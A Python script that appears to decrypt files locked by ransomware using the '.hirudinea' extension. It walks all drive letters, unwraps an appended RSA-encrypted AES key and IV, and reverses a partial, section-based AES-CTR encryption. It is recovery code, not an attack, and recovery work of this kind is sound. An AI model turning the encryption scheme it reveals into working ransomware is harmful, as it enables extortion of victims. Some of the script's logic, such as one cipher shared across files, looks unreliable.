import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def decrypt_section(file_path, cipher, start, end):
    """Decrypt a section of the file."""
    with open(file_path, 'r+b') as file:
        file.seek(start)
        data = file.read(end - start)
        decrypted_data = cipher.decrypt(data)
        file.seek(start)
        file.write(decrypted_data)

# RSA private key (replace with actual private key)
private_key = RSA.import_key('''-----BEGIN RSA PRIVATE KEY-----
MIIJJwIBAAKCAgEAsxNQf7BkOgwjqtvrMFJ3gzgFngFm+joMX+EM/9s23WMIzq1e...
-----END RSA PRIVATE KEY-----''')

# Decrypt the AES key and IV with RSA
def rsa_decrypt(data, priv_key):
    rsa_cipher = PKCS1_OAEP.new(priv_key)
    return rsa_cipher.decrypt(data)

# Function to find an encrypted file and extract the key and IV
def extract_key_iv(drives):
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            for file in files:
                if file.endswith('.hirudinea'):
                    with open(os.path.join(root, file), 'rb') as encrypted_file:
                        encrypted_file.seek(-1024, os.SEEK_END)  # Go to the last 1024 bytes
                        encrypted_key = encrypted_file.read(512)
                        encrypted_iv = encrypted_file.read(512)
                        return rsa_decrypt(encrypted_key, private_key), rsa_decrypt(encrypted_iv, private_key)
    raise FileNotFoundError("No encrypted files found.")

# Find all present drives
drives = [f"{chr(letter)}:\\" for letter in range(65, 91) if os.path.exists(f"{chr(letter)}:\\")]

# Extract key and IV
key, iv = extract_key_iv(drives)

# Create the AES CRT cipher
cipher = AES.new(key, AES.MODE_CTR, nonce=b'', initial_value=iv)

# Decrypt all files
for drive in drives:
    for root, dirs, files in os.walk(drive):
        for file in files:
            if file.endswith('.hirudinea'):
                file_path = os.path.join(root, file)
                file_size = os.path.getsize(file_path) - 1024  # Adjusted for the appended key and IV

                # Determine number of sections and size of each section
                if file_size <= 2 * 1024 * 1024:  # 0-2MB, no division
                    sections = [(0, min(1024 * 1024, file_size))]
                elif 2 * 1024 * 1024 < file_size <= 4 * 1024 * 1024:  # 2-4MB, divide into 2 sections
                    sections = [(0, 1024 * 1024), (2 * 1024 * 1024, min(file_size, 3 * 1024 * 1024))]
                else:  # >4MB, divide into 4 sections
                    section_size = file_size // 4
                    sections = [(i, min(i + 1024 * 1024, i + section_size)) for i in range(0, file_size, section_size)]

                # Decrypt each section
                for start, end in sections:
                    decrypt_section(file_path, cipher, start, end)

                # Remove the appended key and IV
                with open(file_path, 'r+b') as file:
                    file.truncate(file_size)

                # Rename the file to remove the extension
                os.rename(file_path, file_path[:-10])

print("Decryption complete.")

